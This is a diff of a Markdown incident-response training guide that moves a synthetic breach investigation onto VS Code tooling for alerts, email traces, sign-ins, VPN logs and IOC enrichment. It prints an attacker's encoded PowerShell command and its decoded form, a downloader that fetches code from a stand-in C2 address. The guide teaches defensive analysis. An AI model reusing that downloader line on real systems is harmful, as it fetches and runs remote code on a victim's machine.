@@ -19,7 +19,7 @@ sidebar_position: 2
 - [Step 0: Intake — What the First Call Captures](#step-0-intake--what-the-first-call-captures)
 - [Step 1–2: Project Setup and Scope](#step-12-project-setup-and-scope)
 - [Step R1: Evidence Inventory — What Exists and What Is Missing](#step-r1-evidence-inventory--what-exists-and-what-is-missing)
-- [Step R1.5: Hands-On Evidence Analysis — Tools and Commands](#step-r15-hands-on-evidence-analysis--tools-and-commands)
+- [Step R1.5: Hands-On Evidence Analysis — VS Code Investigation](#step-r15-hands-on-evidence-analysis--vs-code-investigation)
 - [Step R2: Timeline — Two Paths, One Actor](#step-r2-timeline--two-paths-one-actor)
 - [Step R3: Claims Ledger — Every Assertion Traced to Evidence](#step-r3-claims-ledger--every-assertion-traced-to-evidence)
 - [Step R4: ATT&CK Mapping — Where Detection Failed](#step-r4-attck-mapping--where-detection-failed)
@@ -685,36 +685,59 @@ git commit -m "PROJ-2024-001: evidence inventory — 6 sources, GAP-001 (10-day 
 
 ---
 
-## Step R1.5: Hands-On Evidence Analysis — Tools and Commands
+## Step R1.5: Hands-On Evidence Analysis — VS Code Investigation
 
-The evidence inventory tells you what exists. This step analyzes it. Work through every source in the order listed — each one feeds the next. The timeline in Step R2 is the product of this analysis, not a separate exercise.
+The evidence inventory tells you what exists. This step analyzes it. VS Code is the primary tool: one window holds the evidence tree, the formatted logs, the API calls, and the terminal — no context-switching between applications.
 
-### Download the Training Evidence
+### Setup — Open the Evidence Folder
 
-All synthetic log files are in the repository under `investigations/lifetech-2024-11/01-evidence/`. If you have not already cloned the repository, do so now:
+```bash
+# One command opens the entire evidence directory as a workspace
+code ~/investigations/lifetech-2024-11/01-evidence/
+```
+
+VS Code opens with the Explorer panel showing the full evidence tree. Every JSON, JSONL, CSV, and syslog file is one click away.
+
+**Install four extensions before starting** (`Ctrl+Shift+X`, search by ID):
+
+| Extension | ID | Purpose |
+|---|---|---|
+| Rainbow CSV | `mechatroner.rainbow-csv` | Column-aware CSV viewer with RBQL SQL query |
+| REST Client | `humao.rest-client` | Run VirusTotal / Shodan API calls inline |
+| Hex Editor | `ms-vscode.hexeditor` | Inspect binary files without leaving VS Code |
+| Prettier | `esbenp.prettier-vscode` | Auto-format JSON/JSONL on open (`Shift+Alt+F`) |
+
+Or install all at once from the integrated terminal (`Ctrl+`` `):
+
+```bash
+code --install-extension mechatroner.rainbow-csv
+code --install-extension humao.rest-client
+code --install-extension ms-vscode.hexeditor
+code --install-extension esbenp.prettier-vscode
+```
+
+**Key VS Code shortcuts used throughout this step:**
+
+| Shortcut | What it does |
+|---|---|
+| `Ctrl+`` ` `` | Toggle integrated terminal |
+| `Ctrl+F` | Search in current file |
+| `Ctrl+Shift+F` | Search across all open files (global pivot) |
+| `Ctrl+Shift+O` | JSON Outline — navigate nested structure |
+| `Shift+Alt+F` | Format current file (Prettier) |
+| `F5` | Open RBQL query console (Rainbow CSV) |
+| `Ctrl+G` | Go to line / offset (Hex Editor) |
+
+**Download the training evidence:**
 
 ```bash
 git clone https://github.com/anpa1200/CTI_as_a_Code.git
-cd CTI_as_a_Code/investigations/lifetech-2024-11/01-evidence/
-ls -la
+code ~/CTI_as_a_Code/investigations/lifetech-2024-11/01-evidence/
 ```
 
-Expected output:
-```
-GAP-001-ws-it-levi-sysmon.md
-crowdstrike/
-m365/
-azure-ad/
-vpn/
-sysmon/
-windows-security/
-palo-alto/
-sql-audit/
-```
+Direct links to open any file in GitHub (also downloadable via `curl -L`):
 
-Direct links to each file — open in browser or download with `curl -L`:
-
-| File | Format | What It Contains | Direct Link |
+| File | Format | What It Contains | GitHub |
 |---|---|---|---|
 | `m365/message-trace-p.levi.csv` | CSV | IT admin phishing delivery, Oct 15–24 | [GitHub](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/01-evidence/m365/message-trace-p.levi.csv) |
 | `m365/message-trace-m.cohen.csv` | CSV | CFO phishing delivery, Nov 13–15 | [GitHub](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/01-evidence/m365/message-trace-m.cohen.csv) |
@@ -729,27 +752,36 @@ Direct links to each file — open in browser or download with `curl -L`:
 | `sql-audit/SERVER-RD-02-sql-audit.jsonl` | JSONL | SQL Server audit — full xp_cmdshell exfil chain | [GitHub](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/01-evidence/sql-audit/SERVER-RD-02-sql-audit.jsonl) |
 | `GAP-001-ws-it-levi-sysmon.md` | Markdown | Documented 10-day Sysmon gap on IT admin host | [GitHub](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/01-evidence/GAP-001-ws-it-levi-sysmon.md) |
 
-Copy all evidence into your case folder:
-
-```bash
-cp -r ~/CTI_as_a_Code/investigations/lifetech-2024-11/01-evidence/ \
-       ~/investigations/lifetech-2024-11/
-cd ~/investigations/lifetech-2024-11/01-evidence/
-```
-
-All commands in this section run from that directory.
-
 ---
 
-### 1. Start with the Trigger — CrowdStrike Alert
+### 1. CrowdStrike Alert — JSON in VS Code
 
-The investigation starts with the alert that opened the case. Read it before querying any SIEM.
+**In VS Code Explorer:** click `crowdstrike/WS-CFO-01-alert-20241115.json`
 
-**File:** `crowdstrike/WS-CFO-01-alert-20241115.json`
+Press `Shift+Alt+F` to auto-format. The nested structure becomes readable with collapsible sections.
+
+**Open the Outline panel** (`Ctrl+Shift+O`):
+```
+▶ meta
+▼ resources
+  ▼ [0]
+    ▶ device        — hostname, OS, groups
+    ▼ behaviors
+      [0] Execution / T1059.001  — OUTLOOK.EXE → powershell.exe
+      [1] Command and Control / T1071.001
+      [2] Persistence / T1547.001
+      [3] Credential Access / T1003.001
+    ▶ network_accesses
+    ▶ prevention_policy
+```
+
+Click any node to jump directly to that section. Click `prevention_policy` — you see `"prevent": false` immediately. The CFO's machine is in detect-only mode; the C2 connection is live. **Take the memory dump before anything else.**
+
+**Search** (`Ctrl+F`): type `prevented` → jumps to `"prevent": false`. Type `cmdline` → jumps to the encoded PowerShell command.
+
+**Extract key fields in the integrated terminal** (`Ctrl+`` `):
 
 ```bash
-# Get the detection summary — check severity and whether the process was prevented
-# The Falcon API wraps detections under .resources[]
 jq '.resources[0] | {
   detection_id,
   severity:  .max_severity_displayname,
@@ -770,92 +802,39 @@ Output:
 }
 ```
 
-`"prevented": false` — the CFO's machine was in detect-only mode (Executive Detect-Only Policy). The process was never killed. The C2 connection is live at this moment. **Take the memory dump before you do anything else.**
-
 ```bash
-# List all detected behaviors — each is a TTP
+# List all detected behaviors
 jq '.resources[0].behaviors[] | {
-  timestamp,
-  tactic,
-  technique_id,
-  display_name,
+  timestamp, tactic, technique_id, display_name,
   parent: .parent_image_filename,
   image:  .filename,
   cmdline: (.cmdline // "" | .[0:80])
 }' crowdstrike/WS-CFO-01-alert-20241115.json
 ```
 
-Output:
-```
-{"timestamp":"2024-11-15T16:42:33Z","tactic":"Execution","technique_id":"T1059.001",
- "display_name":"Malicious PowerShell via Office Application",
- "parent":"OUTLOOK.EXE","image":"powershell.exe",
- "cmdline":"powershell.exe  -NonI -W Hidden -Enc JABjAD0ATgBlAHcALQBP..."}
-
-{"timestamp":"2024-11-15T16:42:41Z","tactic":"Command and Control","technique_id":"T1071.001",
- "display_name":"Suspicious Outbound HTTPS Connection",...}
-
-{"timestamp":"2024-11-15T16:43:08Z","tactic":"Persistence","technique_id":"T1547.001",
- "display_name":"Executable Written to AppData",...}
-
-{"timestamp":"2024-11-15T16:46:22Z","tactic":"Credential Access","technique_id":"T1003.001",
- "display_name":"LSASS Memory Access",...}
-```
-
 ```bash
-# Extract observed network connections from the alert
+# Network connections observed
 jq '.resources[0].network_accesses[] | {
-  remote_address,
-  remote_port,
-  protocol,
-  direction: .connection_direction,
-  timestamp
+  remote_address, remote_port, direction, timestamp
 }' crowdstrike/WS-CFO-01-alert-20241115.json
 ```
 
-Output:
-```json
-{"remote_address": "203.0.113.87", "remote_port": 443, "protocol": "TCP",
- "direction": "OUTBOUND", "timestamp": "2024-11-15T16:42:41Z"}
-{"remote_address": "203.0.113.87", "remote_port": 443, "protocol": "TCP",
- "direction": "OUTBOUND", "timestamp": "2024-11-15T16:49:22Z"}
-{"remote_address": "203.0.113.87", "remote_port": 443, "protocol": "TCP",
- "direction": "OUTBOUND", "timestamp": "2024-11-15T16:56:03Z"}
-```
-
 ```bash
-# Check prevention policy — confirm detect-only mode
+# Prevention policy — confirm detect-only mode and note the policy gap
 jq '.resources[0].prevention_policy | {name, prevent, detect, note}' \
   crowdstrike/WS-CFO-01-alert-20241115.json
 ```
-
-Output:
-```json
-{
-  "name":    "Executive Detect-Only Policy",
-  "prevent": false,
-  "detect":  true,
-  "note":    "⚠ POLICY GAP: This machine is in detect-only mode. svchost32.exe was NOT automatically killed."
-}
-```
-
-Write these down. They are your starting IOC set for enrichment. Everything else in this step expands from here.
 
 ---
 
 ### 2. Decode the PowerShell Payload
 
-The alert shows a `-Enc` base64 argument. Decode it now — before querying the SIEM, before enriching the IP. It tells you what the first stage executed and where it called home.
+In the formatted JSON still open in VS Code, press `Ctrl+F` and search `-Enc` — the base64 argument is on the same line. Copy it.
 
-**From the CrowdStrike behavior:**
-```
-powershell.exe -NonI -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJwBNAG8AegBpAGwAbABhAC8ANQAuADAAJwApADsAJABkAD0AJABjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADcALwB1AHAAZABhAHQAZQAnACkA
-```
-
-**Decode locally — never paste encoded malware into online decoders:**
+**Decode in the integrated terminal** — do not paste encoded malware into online decoders:
 
 ```bash
-# PowerShell's -Enc flag uses UTF-16LE base64
+# PowerShell -Enc uses UTF-16LE encoding
 echo "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJwBNAG8AegBpAGwAbABhAC8ANQAuADAAJwApADsAJABkAD0AJABjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADcALwB1AHAAZABhAHQAZQAnACkA" \
   | base64 -d | iconv -f UTF-16LE -t UTF-8
 ```
@@ -865,191 +844,109 @@ Output:
 $c=New-Object System.Net.WebClient;$c.Headers.Add('User-Agent','Mozilla/5.0');$d=$c.DownloadString('https://203.0.113.87/update')
 ```
 
-What this tells you immediately:
-- **`DownloadString`** — downloads and executes in memory, no file written by this stage
-- **C2 confirmed:** `203.0.113.87/update` — matches the CrowdStrike network IOC
-- **User-Agent:** `Mozilla/5.0` — disguises as a browser request to evade proxy inspection
-- **Pattern:** first-stage downloader followed by a second stage — look for the file drop in Sysmon
+**In VS Code Explorer:** click `sysmon/WS-CFO-01-sysmon.jsonl`. Press `Ctrl+F`, search `"EventID": 11` — jumps to the file creation event showing `svchost32.exe` dropped to `AppData\Roaming`. The `analyst_note` field confirms the fake PE timestamp.
 
 ```bash
-# Confirm in Sysmon what the PowerShell actually dropped (EID 11 = file create)
+# Cross-check: confirm what the PowerShell dropped
 jq 'select(.EventID == 11) | {
-  time:       .TimeCreated,
-  dropped_by: .Image,
-  file:       .TargetFilename,
-  note:       .analyst_note
+  time: .TimeCreated, dropped_by: .Image, file: .TargetFilename, note: .analyst_note
 }' sysmon/WS-CFO-01-sysmon.jsonl
 ```
 
-Output:
-```json
-{
-  "time":       "2024-11-15T16:43:08Z",
-  "dropped_by": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-  "file":       "C:\\Users\\m.cohen\\AppData\\Roaming\\Microsoft\\Windows\\svchost32.exe",
-  "note":       "⚠ svchost32.exe dropped to AppData\\Roaming — masquerading as legitimate svchost. Fake PE timestamp: 2018-04-09T08:00:00Z (timestomped)"
-}
-```
-
-Flag the `analyst_note` PE timestamp comment — you will prove this is forged during binary analysis (Section 8).
-
 ---
 
-### 3. M365 Message Trace — Find the Delivery Vector
+### 3. M365 Message Trace — Rainbow CSV
 
-**Files:**
-- `m365/message-trace-p.levi.csv` — IT admin mailbox (Oct 15–24)
-- `m365/message-trace-m.cohen.csv` — CFO mailbox (Nov 13–15)
+**In VS Code Explorer:** click `m365/message-trace-p.levi.csv`
 
-```bash
-# Show the header to understand column structure
-head -2 m365/message-trace-p.levi.csv
+With Rainbow CSV installed, every column gets its own color. The status bar at the bottom shows the column name as you move the cursor.
+
+**RBQL — SQL queries against the CSV, no Python needed:**
+
+Press `F5` (or click `RBQL` in the status bar) to open the query console:
+
+```sql
+-- Find all emails where authentication failed
+SELECT a.received_time, a.sender_address, a.subject,
+       a.status, a.SCL, a.DKIM_result, a.SPF_result, a.DMARC
+FROM a
+WHERE a.DMARC == 'fail'
+ORDER BY a.received_time
 ```
 
-```python
-# Find all emails with authentication failures (phishing indicators)
-import csv
-
-for fname, label in [('m365/message-trace-p.levi.csv', 'IT admin'),
-                     ('m365/message-trace-m.cohen.csv', 'CFO')]:
-    print(f"\n--- {label} ---")
-    with open(fname) as f:
-        reader = csv.DictReader(f)
-        for row in reader:
-            if row.get('DMARC') == 'fail' or row.get('SPF_result') == 'fail':
-                print(f"  Date:       {row['received_time']}")
-                print(f"  From:       {row['sender_address']}")
-                print(f"  Subject:    {row['subject']}")
-                print(f"  Delivered:  {row['status']}")
-                print(f"  SCL:        {row.get('SCL', '?')}")
-                print(f"  DKIM:       {row.get('DKIM_result', '?')}")
-                print(f"  SPF:        {row.get('SPF_result', '?')}")
-                print(f"  DMARC:      {row.get('DMARC', '?')}")
-                print(f"  Attachment: {row.get('has_attachment', '0')}")
-                print()
+Result pane (right side):
+```
+2024-10-22T11:23:07Z | security-noreply@mfa-lifetechpharma.com
+  | ACTION REQUIRED: MFA Re-enrollment — LifeTech IT Security
+  | Delivered | 4 | fail | fail | fail
 ```
 
-**Key finding — IT admin (p.levi):**
-```
-Date:       2024-10-22T11:23:07Z
-From:       security-noreply@mfa-lifetechpharma.com
-Subject:    ACTION REQUIRED: MFA Re-enrollment — LifeTech IT Security
-Delivered:  Delivered
-SCL:        4    ← blocked at SCL ≥ 5; this scored 4
-DKIM:       fail
-SPF:        fail
-DMARC:      fail
+Three auth failures in one row. SCL=4 delivered because the threshold is 5. Add `mfa-lifetechpharma.com` to IOC list.
+
+```sql
+-- Sort by SCL descending — highest-confidence spam at top
+SELECT * FROM a ORDER BY CAST(a.SCL AS int) DESC
 ```
 
-Three authentication failures — the email is forged. Delivered because SCL=4 fell one point below the block threshold. Add `mfa-lifetechpharma.com` to your IOC list.
-
-**Key finding — CFO (m.cohen):**
-```
-Date:       2024-11-15T15:58:08Z
-From:       contracts@globalcontracts-secure.net
-Subject:    Q4-2024 Licensing Agreement Review — Action Required (URGENT)
-Delivered:  Delivered
-SCL:        4
-DKIM:       fail
-SPF:        fail
-DMARC:      fail
-Attachment: 1    ← .xlsm Excel macro file
+```sql
+-- Find emails with attachments that failed auth
+SELECT a.received_time, a.sender_address, a.subject, a.has_attachment, a.SCL
+FROM a
+WHERE a.has_attachment == '1' AND a.DMARC == 'fail'
 ```
 
-The `.xlsm` attachment was not sandboxed — Microsoft ATP was not configured to detonate macro-enabled Excel files. This is the policy gap documented in the source registry (INT-007). Add `globalcontracts-secure.net` to IOC list.
+**Save RBQL results:** click **Save to CSV** in the result panel → save as `03-analysis/m365-suspects.csv`.
 
-**Alternative: explore the same CSVs interactively with VisiData**
+**Switch to `m365/message-trace-m.cohen.csv`** (click in Explorer):
 
-VisiData is a terminal spreadsheet for structured data. Install it once:
-
-```bash
-pip install visidata
-# or: apt install visidata / brew install visidata
+```sql
+-- CFO mailbox — find the malicious delivery
+SELECT a.received_time, a.sender_address, a.subject, a.SCL, a.DMARC, a.has_attachment
+FROM a
+WHERE a.DMARC == 'fail' OR a.has_attachment == '1'
+ORDER BY a.received_time
 ```
 
-Open a message trace file:
-
-```bash
-vd m365/message-trace-p.levi.csv
+Key finding — CFO phishing email:
+```
+2024-11-15T15:58:08Z | contracts@globalcontracts-secure.net
+  | Q4-2024 Licensing Agreement Review — Action Required (URGENT)
+  | SCL=4 | DMARC=fail | has_attachment=1
 ```
 
-VisiData opens in the terminal showing all rows and columns. Key commands for this file:
-
-| Keys | What it does |
-|---|---|
-| `←` `→` or `h` `l` | Move between columns |
-| `↑` `↓` or `j` `k` | Move between rows |
-| `g` `←` / `g` `→` | Jump to first / last column |
-| `/` then `fail` `Enter` | Search forward for "fail" in current column |
-| `n` / `N` | Next / previous search match |
-
-**Frequency table on the DMARC column — instantly see pass/fail counts:**
-
-1. Navigate to the `DMARC` column (`←`/`→` until cursor is on it)
-2. Press `F`
-
-VisiData opens a new frequency sheet:
-```
-DMARC    count  percent
-fail        3    21.4%
-pass       11    78.6%
-```
-
-Three `fail` rows out of 14 — those are your suspects. Press `q` to close the frequency sheet and return.
-
-**Filter to show only rows where DMARC = fail:**
-
-1. Navigate to the `DMARC` column
-2. Press `|` (select by regex), type `fail`, press `Enter` — matching rows are highlighted
-3. Press `"` — opens a new sheet containing only the selected rows
-
-You now have a filtered view of just the malicious emails. Press `q` to close and return.
-
-**Sort by SCL to find highest-confidence spam:**
-
-1. Navigate to the `SCL` column
-2. Press `#` to set column type to integer (so sort is numeric, not lexicographic)
-3. Press `]` to sort descending — highest SCL rows appear at top
-
-**Save your filtered view as a new CSV:**
-
-```
-g Ctrl+S  → save current sheet to a new file
-```
-
-Type a filename like `m365-phishing-only.csv` and press `Enter`. The filtered rows are saved for future reference.
+The `.xlsm` attachment was not sandboxed — ATP policy gap (INT-007). Add `globalcontracts-secure.net` to IOC list.
 
 ---
 
 ### 4. Azure AD Sign-In Analysis
 
-**File:** `azure-ad/signin-p.levi.json`
+**In VS Code Explorer:** click `azure-ad/signin-p.levi.json`
+
+Press `Shift+Alt+F` to format. Open the Outline (`Ctrl+Shift+O`) — the array shows four sign-in entries. Click entry `[1]` to jump to `aad-signin-002`.
+
+**Search** `Ctrl+F`: type `Istanbul` — jumps directly to the suspicious sign-in. Read surrounding context without running any command:
+
+```json
+"city": "Istanbul",
+"countryOrRegion": "TR",
+"conditionalAccessStatus": "notApplied",
+"succeeded": null
+```
+
+Three red flags visible immediately in the file: foreign city, CA bypassed, no MFA.
+
+**Full structured extraction in the terminal:**
 
 ```bash
-# Extract all sign-ins with key fields
 jq '.[] | {
   id,
   time: .properties.createdDateTime,
-  user: .properties.userPrincipalName,
-  ip: .properties.ipAddress,
-  location: "\(.properties.location.city), \(.properties.location.countryOrRegion)",
-  status: .properties.status.errorCode,
-  mfa_satisfied: .properties.authenticationDetails[0].succeeded,
-  conditional_access: .properties.conditionalAccessStatus,
-  os: .properties.deviceDetail.operatingSystem,
-  is_compliant: .properties.deviceDetail.isCompliant
+  ip:   .properties.ipAddress,
+  loc:  "\(.properties.location.city), \(.properties.location.countryOrRegion)",
+  mfa:  .properties.authenticationDetails[0].succeeded,
+  ca:   .properties.conditionalAccessStatus,
+  os:   .properties.deviceDetail.operatingSystem
 }' azure-ad/signin-p.levi.json
-```
-
-Output:
-```
-{"id":"aad-signin-001","time":"2024-10-22T07:14:32Z","user":"p.levi@lifetechpharma.com",
- "ip":"213.8.xx.xx","location":"Tel Aviv, IL","status":0,"mfa_satisfied":true,
- "conditional_access":"success","os":"Windows 10","is_compliant":true}
-
-{"id":"aad-signin-002","time":"2024-10-22T09:31:18Z","user":"p.levi@lifetechpharma.com",
- "ip":"185.220.101.47","location":"Istanbul, TR","status":0,"mfa_satisfied":null,
- "conditional_access":"notApplied","os":null,"is_compliant":null}
 ```
 
 **Red flags on `aad-signin-002`:**
@@ -1057,798 +954,507 @@ Output:
 | Field | Value | Why It Matters |
 |---|---|---|
 | Location | Istanbul, Turkey | p.levi lives in Rehovot, Israel |
-| MFA satisfied | `null` | No MFA challenge was presented — token already contained MFA assertion |
-| Conditional access | `notApplied` | CA policy was bypassed — token replay skips conditional access evaluation |
-| OS | `null` | Unknown device — not registered in Azure AD |
-| Time delta | +2h17m from sign-in 001 | p.levi authenticated at 07:14, attacker replayed the stolen token at 09:31 |
-
-The AiTM proxy sits between the user and Azure AD during sign-in 001. It captures the authenticated session token and replays it 2 hours later from Istanbul. Since the token was issued after MFA completion, Azure AD accepts it without re-challenging.
-
-```bash
-# Check sign-in 004 — the VPN session day
-jq '.[] | select(.id == "aad-signin-004") | {
-  time: .properties.createdDateTime,
-  ip: .properties.ipAddress,
-  location: "\(.properties.location.city), \(.properties.location.countryOrRegion)",
-  additional: .properties.authenticationDetails[].authenticationMethod
-}' azure-ad/signin-p.levi.json
-```
-
-Sign-in 004 is the Oct 24 VPN session from the same Istanbul IP — same ASN, same /24 block, confirming the same attacker infrastructure was used two days later.
+| MFA satisfied | `null` | Token replay — MFA already satisfied when token was issued |
+| Conditional access | `notApplied` | CA policy evaluation is skipped for replayed tokens |
+| OS | `null` | Unknown, unregistered device |
+| Time delta | +2h17m from sign-in 001 | Legitimate login 07:14; attacker replay 09:31 |
 
 ---
 
 ### 5. VPN Log Analysis
 
-**File:** `vpn/anyconnect-2024-10-24.log`
+**In VS Code Explorer:** click `vpn/anyconnect-2024-10-24.log`
 
-Cisco ASA syslog format: `%ASA-[severity]-[message_id]: [message]`
+VS Code opens the plain syslog file. Use `Ctrl+F` to navigate without any commands:
+
+- Search `p.levi` — highlights every line for this user
+- Search `Authentication: successful` — the auth event
+- Search `Assigned address` — the internal IP assigned to the session
+- Search `Duration` — total session length
 
 ```bash
-# Find all authentication and session events for p.levi
+# Full session chain in the terminal:
 grep "p.levi" vpn/anyconnect-2024-10-24.log \
-  | grep -E "(716001|716002|734001|SESSION|Teardown|Authentication)"
+  | grep -E "(716001|716002|734001|Authentication|Teardown|Assigned)"
 ```
 
 Output:
 ```
-Oct 24 00:17:14 ASA %ASA-6-716001: Group <TunnelGroup_VPN> User <p.levi>
-  IP <185.220.101.47> Authentication: successful, Session Type: WebVPN
-Oct 24 00:17:33 ASA %ASA-6-734001: Group <TunnelGroup_VPN> User <p.levi>
-  IP <185.220.101.47> WebVPN session started. Assigned address: 10.10.3.22
-Oct 24 02:29:08 ASA %ASA-6-716002: Group <TunnelGroup_VPN> User <p.levi>
-  IP <185.220.101.47> WebVPN session terminated. Duration: 1h12m34s
+Oct 24 00:17:14 ... User <p.levi> IP <185.220.101.47> Authentication: successful
+Oct 24 00:17:33 ... User <p.levi> ... Assigned address: 10.10.3.22
+Oct 24 02:29:08 ... User <p.levi> ... Duration: 1h12m34s
 ```
 
-The attacker (from `185.220.101.47`) authenticated as p.levi and was assigned `10.10.3.22` — WS-IT-LEVI's own internal IP, making all subsequent activity look like it originated from the legitimate workstation.
+`185.220.101.47` (Istanbul VPN exit) authenticated as p.levi and was assigned `10.10.3.22` — WS-IT-LEVI's own internal IP. All activity during this session looks like it came from the legitimate workstation.
 
 ```bash
-# Look for MFA note in the log
-grep -i "mfa\|multi.factor\|no.*challenge\|bypass" vpn/anyconnect-2024-10-24.log
-```
+grep -i "mfa\|no.*challenge\|bypass" vpn/anyconnect-2024-10-24.log
+# → NOTE: No MFA challenge issued — session token authentication bypass
 
-Output:
+grep "203.0.113.87" vpn/anyconnect-2024-10-24.log | awk '{print $1,$2,$3}' | head -8
+# → ~7-minute C2 beacons during the VPN session window
 ```
-NOTE: No MFA challenge issued — session token authentication bypass
-```
-
-```bash
-# Find C2 beacon pattern during the VPN session window
-grep "203.0.113.87" vpn/anyconnect-2024-10-24.log \
-  | awk '{print $1, $2, $3}' | head -10
-```
-
-~7-minute beacon interval to `203.0.113.87` appears throughout the VPN session — the implant on WS-IT-LEVI was active and calling home from the attacker's assigned internal IP.
 
 ---
 
-### 6. IOC Enrichment — VirusTotal
+### 6. IOC Enrichment — REST Client
 
-You now have an initial IOC set: two C2 IPs, two C2 domains, two phishing domains, and one binary hash. Enrich all of them before building the timeline.
+Create one `.http` file that holds every API call. VS Code's REST Client extension puts a **Send Request** link above each block — click it, the response appears in a split pane on the right. No curl, no terminal, no context switch.
 
-**Setup:**
+**Create the file:**
+
+Press `Ctrl+N`, then `Ctrl+Shift+P` → **Save As** → `03-analysis/ioc-queries.http`
+
+Paste the following:
+
+```http
+### IOC Enrichment — PROJ-2024-001
+### Click "Send Request" above any block — response opens in the right pane
+### Set keys in VS Code Settings > REST Client > Environment Variables
+### or use system env: @VT_KEY = {{$env VT_API_KEY}}
+
+@VT_KEY     = your_virustotal_api_key_here
+@SHODAN_KEY = your_shodan_api_key_here
+@PDNS_KEY   = your_passivedns_key_here
+
+# ── VirusTotal ──────────────────────────────────────────────────────
+
+### VT — Primary C2 IP
+GET https://www.virustotal.com/api/v3/ip_addresses/203.0.113.87
+x-apikey: {{VT_KEY}}
+
+###
+
+### VT — Secondary C2 / exfil IP
+GET https://www.virustotal.com/api/v3/ip_addresses/198.51.100.44
+x-apikey: {{VT_KEY}}
+
+###
+
+### VT — Attacker VPN source
+GET https://www.virustotal.com/api/v3/ip_addresses/185.220.101.47
+x-apikey: {{VT_KEY}}
+
+###
+
+### VT — Primary C2 domain
+GET https://www.virustotal.com/api/v3/domains/telemetry-cdn-services.biz
+x-apikey: {{VT_KEY}}
+
+###
+
+### VT — AiTM phishing page domain
+GET https://www.virustotal.com/api/v3/domains/mfa-lifetechpharma.com
+x-apikey: {{VT_KEY}}
+
+###
+
+### VT — CFO phishing delivery domain
+GET https://www.virustotal.com/api/v3/domains/globalcontracts-secure.net
+x-apikey: {{VT_KEY}}
+
+###
+
+### VT — svchost32.exe binary hash
+GET https://www.virustotal.com/api/v3/files/3b4c14a87e5f9d8c2a1f4e6b9c0d2e7a1b3c5d8f2a4e6c8b0d3e5a7c1f4b8d2e
+x-apikey: {{VT_KEY}}
+
+###
+
+### VT — Imphash pivot (find related samples compiled from same source)
+GET https://www.virustotal.com/api/v3/intelligence/search?query=imphash%3A3a2b1c4d5e6f7a8b9c0d1e2f3a4b5c6d
+x-apikey: {{VT_KEY}}
+
+# ── Shodan ──────────────────────────────────────────────────────────
+
+### Shodan — Primary C2 IP (ports, services, hosting org)
+GET https://api.shodan.io/shodan/host/203.0.113.87?key={{SHODAN_KEY}}
+
+###
+
+### Shodan — Exfil IP
+GET https://api.shodan.io/shodan/host/198.51.100.44?key={{SHODAN_KEY}}
+
+# ── Certificate Transparency ─────────────────────────────────────────
+
+### crt.sh — Find all domains using certs issued to primary C2 IP
+GET https://crt.sh/?q=203.0.113.87&output=json
+
+###
+
+### crt.sh — Cert history for primary C2 domain
+GET https://crt.sh/?q=telemetry-cdn-services.biz&output=json
+
+# ── RDAP ────────────────────────────────────────────────────────────
+
+### RDAP — AiTM phishing domain registration date
+GET https://rdap.org/domain/mfa-lifetechpharma.com
+
+###
+
+### RDAP — CFO phishing delivery domain
+GET https://rdap.org/domain/globalcontracts-secure.net
+
+# ── Passive DNS ─────────────────────────────────────────────────────
+
+### PassiveDNS — Historical resolutions for primary C2 IP
+GET https://api.passivedns.com/v2/search?q=203.0.113.87
+Authorization: Token {{PDNS_KEY}}
+```
+
+**Using the response pane:**
+
+After clicking **Send Request** on the VT IP block, the right pane shows the full JSON response. Use `Ctrl+F` in the response pane to find:
+- `malicious` → `"malicious": 12`
+- `tags` → `["C2", "malware"]`
+- `as_owner` → `"Hostwinds LLC"`
+
+For the crt.sh response, `Ctrl+F` → `name_value` to see all co-hosted domains. `cdn-telemetry-update.biz` and `windows-cdn-service.net` appear — new IOCs not yet seen in the org's DNS logs. Switch to `dns-queries.csv` and `Ctrl+F` to check immediately.
+
+**Commit the `.http` file — it is a reproducible audit trail of every enrichment query:**
 
 ```bash
-export VT_API_KEY="your_virustotal_api_key_here"
-# Free API key at virustotal.com — 4 requests/minute, sufficient for this investigation
+git add 03-analysis/ioc-queries.http
+git commit -m "PROJ-2024-001: IOC enrichment queries — VT, Shodan, crt.sh, RDAP"
 ```
-
-**Enrich the primary C2 IP:**
-
-```bash
-curl -s "https://www.virustotal.com/api/v3/ip_addresses/203.0.113.87" \
-  -H "x-apikey: $VT_API_KEY" | jq '{
-    country:    .data.attributes.country,
-    asn:        .data.attributes.asn,
-    as_owner:   .data.attributes.as_owner,
-    malicious:  .data.attributes.last_analysis_stats.malicious,
-    suspicious: .data.attributes.last_analysis_stats.suspicious,
-    score:      .data.attributes.reputation,
-    tags:       .data.attributes.tags
-  }'
-```
-
-Output:
-```json
-{
-  "country":    "US",
-  "asn":        398704,
-  "as_owner":   "Hostwinds LLC",
-  "malicious":  12,
-  "suspicious": 3,
-  "score":      -35,
-  "tags":       ["C2", "malware"]
-}
-```
-
-12 vendors flag it malicious. `Hostwinds LLC` is a US hosting provider routinely used for VPS-based C2 infrastructure. Community score -35 is strongly negative.
-
-**Enrich the C2 domain:**
-
-```bash
-curl -s "https://www.virustotal.com/api/v3/domains/telemetry-cdn-services.biz" \
-  -H "x-apikey: $VT_API_KEY" | jq '{
-    created:    (.data.attributes.creation_date | todate),
-    registrar:  .data.attributes.registrar,
-    resolves_to:[.data.attributes.last_dns_records[] | select(.type=="A") | .value],
-    malicious:  .data.attributes.last_analysis_stats.malicious,
-    categories: .data.attributes.categories
-  }'
-```
-
-Output:
